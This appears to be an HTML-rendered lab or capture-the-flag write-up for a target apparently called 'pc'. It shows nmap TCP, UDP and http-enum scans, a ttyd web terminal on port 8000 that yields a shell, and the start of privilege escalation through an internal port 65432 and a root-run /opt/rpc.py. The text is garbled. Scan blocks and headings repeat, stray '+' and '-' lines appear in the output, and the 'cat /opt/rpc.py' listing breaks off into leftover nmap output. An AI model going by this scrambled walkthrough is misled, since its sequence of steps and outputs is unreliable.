0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">┌──(kali㉿kali)-[~/Desktop]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">└─<span class="cm-def">$ nmap</span> <span class="cm-def">$IP</span> <span class="cm-attribute">-sC</span> <span class="cm-attribute">-sV</span> <span class="cm-attribute">-p</span> <span class="cm-number">22</span>,8000 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Starting Nmap <span class="cm-number">7</span>.95 ( &lt;https://nmap.org&gt; ) at <span class="cm-number">2026</span><span class="cm-attribute">-01-13</span> <span class="cm-number">01</span>:42 UTC</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Nmap scan report <span class="cm-keyword">for</span> <span class="cm-number">192</span>.168.108.210</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Host is up (0.046s latency).</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
 </span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">PORT &nbsp; &nbsp; STATE SERVICE VERSION</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">22</span>/tcp &nbsp; open &nbsp;<span class="cm-builtin">ssh</span> &nbsp; &nbsp; OpenSSH <span class="cm-number">8</span>.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol <span class="cm-number">2</span>.0)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">| ssh-hostkey: </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">| &nbsp; <span class="cm-number">3072</span> <span class="cm-number">62</span>:36:1a:5c:d3:e3:7b:e1:70:f8:a3:b3:1c:4c:24:38 (RSA)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">| &nbsp; <span class="cm-number">256</span> ee:25:fc:23:66:05:c0:c1:ec:47:c6:bb:00:c7:4f:53 (ECDSA)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">|_ &nbsp;<span class="cm-number">256</span> <span class="cm-number">83</span>:5c:51:ac:32:e5:3a:21:7c:f6:c2:cd:93:68:58:d8 (ED25519)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">8000</span>/tcp open  http &nbsp;  ttyd <span class="cm-number">1</span>.7.3-a2312cb (libwebsockets <span class="cm-number">3</span>.2.0)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">|_http-title: ttyd <span class="cm-attribute">-</span> Terminal</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">|_http-server-header: ttyd/1.7.3-a2312cb (libwebsockets/3.2.0)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
-</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Service detection performed. Please report any incorrect results at &lt;https://nmap.org/submit/&gt; .</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Nmap <span class="cm-keyword">done</span>: <span class="cm-number">1</span> IP address (1 host up) scanned <span class="cm-keyword">in</span> <span class="cm-number">17</span>.27 seconds</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 494px;"></div><div class="CodeMirror-gutters" style="display: none; height: 494px;"></div></div></div></pre><p><span>Lastly, I performed a UDP scan.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 10.3438px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">┌──(kali㉿kali)-[~/Desktop]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">└─<span class="cm-def">$ nmap</span> <span class="cm-def">$IP</span> <span class="cm-attribute">-sU</span> <span class="cm-attribute">--top-ports</span> <span class="cm-number">10</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Starting Nmap <span class="cm-number">7</span>.95 ( &lt;https://nmap.org&gt; ) at <span class="cm-number">2026</span><span class="cm-attribute">-01-13</span> <span class="cm-number">01</span>:42 UTC</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Nmap scan report <span class="cm-keyword">for</span> <span class="cm-number">192</span>.168.108.210</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Host is up (0.046s latency).</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
+</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Service detection performed. Please report any incorrect results at &lt;https://nmap.org/submit/&gt; .</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Nmap <span class="cm-keyword">done</span>: <span class="cm-number">1</span> IP address (1 host up) scanned <span class="cm-keyword">in</span> <span class="cm-number">17</span>.27 seconds</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 417px;"></div><div class="CodeMirror-gutters" style="display: none; height: 417px;"></div></div></div></pre><p><span>Lastly, I performed a UDP scan.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 8.96875px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">┌──(kali㉿kali)-[~/Desktop]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">└─<span class="cm-def">$ nmap</span> <span class="cm-def">$IP</span> <span class="cm-attribute">-sU</span> <span class="cm-attribute">--top-ports</span> <span class="cm-number">10</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Starting Nmap <span class="cm-number">7</span>.95 ( &lt;https://nmap.org&gt; ) at <span class="cm-number">2026</span><span class="cm-attribute">-01-13</span> <span class="cm-number">01</span>:42 UTC</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Nmap scan report <span class="cm-keyword">for</span> <span class="cm-number">192</span>.168.108.210</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Host is up (0.046s latency).</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
 </span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">PORT &nbsp; &nbsp; STATE &nbsp; &nbsp; &nbsp; &nbsp; SERVICE</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">53</span>/udp &nbsp; closed &nbsp; &nbsp; &nbsp;  domain</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">67</span>/udp &nbsp; closed &nbsp; &nbsp; &nbsp;  dhcps</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">123</span>/udp  closed &nbsp; &nbsp; &nbsp;  ntp</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">135</span>/udp  open|filtered msrpc</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">137</span>/udp  open|filtered netbios-ns</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">138</span>/udp  closed &nbsp; &nbsp; &nbsp;  netbios-dgm</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">161</span>/udp  closed &nbsp; &nbsp; &nbsp;  snmp</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">445</span>/udp  closed &nbsp; &nbsp; &nbsp;  microsoft-ds</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">631</span>/udp  closed &nbsp; &nbsp; &nbsp;  ipp</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">1434</span>/udp closed &nbsp; &nbsp; &nbsp;  ms-sql-m</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
-</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Nmap <span class="cm-keyword">done</span>: <span class="cm-number">1</span> IP address (1 host up) scanned <span class="cm-keyword">in</span> <span class="cm-number">6</span>.32 seconds</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 469px;"></div><div class="CodeMirror-gutters" style="display: none; height: 469px;"></div></div></div></pre><h1 id='initial-access'><span>Initial Access</span></h1><h2 id='http---8000'><span>HTTP - 8000</span></h2><p><span>Whenever I see an HTTP service running on a port, I usually run an Nmap script before opening it in a browser. This often revealed hidden paths for me.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 10.3438px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">┌──(kali㉿kali)-[~/Desktop]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">└─<span class="cm-def">$ nmap</span> <span class="cm-def">$IP</span> <span class="cm-attribute">-sV</span> <span class="cm-attribute">--script</span><span class="cm-operator">=</span>http-enum <span class="cm-attribute">-p</span> <span class="cm-number">8000</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Starting Nmap <span class="cm-number">7</span>.95 ( &lt;https://nmap.org&gt; ) at <span class="cm-number">2026</span><span class="cm-attribute">-01-13</span> <span class="cm-number">01</span>:45 UTC</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Nmap scan report <span class="cm-keyword">for</span> <span class="cm-number">192</span>.168.108.210</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Host is up (0.081s latency).</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
+</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Nmap <span class="cm-keyword">done</span>: <span class="cm-number">1</span> IP address (1 host up) scanned <span class="cm-keyword">in</span> <span class="cm-number">6</span>.32 seconds</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 417px;"></div><div class="CodeMirror-gutters" style="display: none; height: 417px;"></div></div></div></pre><h1 id='initial-access'><span>Initial Access</span></h1><h2 id='http---8000'><span>HTTP - 8000</span></h2><p><span>Whenever I see an HTTP service running on a port, I usually run an Nmap script before opening it in a browser. This often revealed hidden paths for me.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 8.96875px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">┌──(kali㉿kali)-[~/Desktop]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">└─<span class="cm-def">$ nmap</span> <span class="cm-def">$IP</span> <span class="cm-attribute">-sV</span> <span class="cm-attribute">--script</span><span class="cm-operator">=</span>http-enum <span class="cm-attribute">-p</span> <span class="cm-number">8000</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Starting Nmap <span class="cm-number">7</span>.95 ( &lt;https://nmap.org&gt; ) at <span class="cm-number">2026</span><span class="cm-attribute">-01-13</span> <span class="cm-number">01</span>:45 UTC</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Nmap scan report <span class="cm-keyword">for</span> <span class="cm-number">192</span>.168.108.210</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Host is up (0.081s latency).</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
 </span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">PORT &nbsp; &nbsp; STATE SERVICE VERSION</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">8000</span>/tcp open  http &nbsp;  ttyd <span class="cm-number">1</span>.7.3-a2312cb (libwebsockets <span class="cm-number">3</span>.2.0)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">|_http-server-header: ttyd/1.7.3-a2312cb (libwebsockets/3.2.0)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
-</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Service detection performed. Please report any incorrect results at &lt;https://nmap.org/submit/&gt; .</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Nmap <span class="cm-keyword">done</span>: <span class="cm-number">1</span> IP address (1 host up) scanned <span class="cm-keyword">in</span> <span class="cm-number">114</span>.58 seconds</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 321px;"></div><div class="CodeMirror-gutters" style="display: none; height: 321px;"></div></div></div></pre><p><span>Surprisingly, the service on port 8000 was a web-based terminal (ttyd), providing immediate shell access without further exploitation.</span></p><p><img src="./pc.assets/image-20260128203838951.png" alt="image-20260128203838951"></p><h1 id='privilege-escalation'><span>Privilege Escalation</span></h1><p><code>ss</code><span> shows that there’s a service running internally on port 65432.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 10.3438px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">user@pc:/dev/shm<span class="cm-def">$ ss</span> <span class="cm-attribute">-tulnp</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Netid &nbsp; &nbsp; State &nbsp; &nbsp;  Recv-Q &nbsp; &nbsp; Send-Q &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Local Address:Port &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  Peer Address:Port &nbsp; &nbsp; Process &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">udp &nbsp; &nbsp; &nbsp; UNCONN &nbsp; &nbsp; <span class="cm-number">0</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-number">0</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-number">127</span>.0.0.53%lo:53 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="cm-number">0</span>.0.0.0:* &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">tcp &nbsp; &nbsp; &nbsp; LISTEN &nbsp; &nbsp; <span class="cm-number">0</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-number">4096</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="cm-number">127</span>.0.0.53%lo:53 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="cm-number">0</span>.0.0.0:* &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">tcp &nbsp; &nbsp; &nbsp; LISTEN &nbsp; &nbsp; <span class="cm-number">0</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-number">128</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-number">0</span>.0.0.0:22 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="cm-number">0</span>.0.0.0:* &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">tcp &nbsp; &nbsp; &nbsp; LISTEN &nbsp; &nbsp; <span class="cm-number">0</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-number">2048</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="cm-number">127</span>.0.0.1:65432 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-number">0</span>.0.0.0:* &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">tcp &nbsp; &nbsp; &nbsp; LISTEN &nbsp; &nbsp; <span class="cm-number">0</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-number">128</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-number">0</span>.0.0.0:8000 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="cm-number">0</span>.0.0.0:* &nbsp; &nbsp; &nbsp; &nbsp; users:((<span class="cm-string">"ttyd"</span><span class="cm-def">,pid</span><span class="cm-operator">=</span><span class="cm-number">1009</span><span class="cm-def">,fd</span><span class="cm-operator">=</span><span class="cm-number">12</span>)) &nbsp; &nbsp; </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">tcp &nbsp; &nbsp; &nbsp; LISTEN &nbsp; &nbsp; <span class="cm-number">0</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-number">128</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; [::]:22 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  [::]:* </span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 346px;"></div><div class="CodeMirror-gutters" style="display: none; height: 346px;"></div></div></div></pre><p><span>Then I ran pspy. A specific process stood out in the pspy output: a Python script </span><code>/opt/rpc.py</code><span> being executed with root privileges.</span></p><p><img src="./pc.assets/image-20260128203848323.png" alt="image-20260128203848323"></p><p><span>I read the code inside the file </span><code>/opt/rpc.py</code><span> and the last line of the file is connecting to port 65432.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 10.3438px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">user@pc:/dev/shm<span class="cm-def">$ cat</span> /opt/rpc.py </span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">from typing import AsyncGenerator</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">from typing_extensions import TypedDict</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
+</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Service detection performed. Please report any incorrect results at &lt;https://nmap.org/submit/&gt; .</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Nmap <span class="cm-keyword">done</span>: <span class="cm-number">1</span> IP address (1 host up) scanned <span class="cm-keyword">in</span> <span class="cm-number">114</span>.58 seconds</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 263px;"></div><div class="CodeMirror-gutters" style="display: none; height: 263px;"></div></div></div></pre><p><span>Surprisingly, the service on port 8000 was a web-based terminal (ttyd), providing immediate shell access without further exploitation.</span></p><p><img src="./pc.assets/image-20260128203838951.png" alt="image-20260128203838951"></p><h1 id='privilege-escalation'><span>Privilege Escalation</span></h1><p><code>ss</code><span> shows that there’s a service running internally on port 65432.</span></p><pre class="md-fences md-end-block 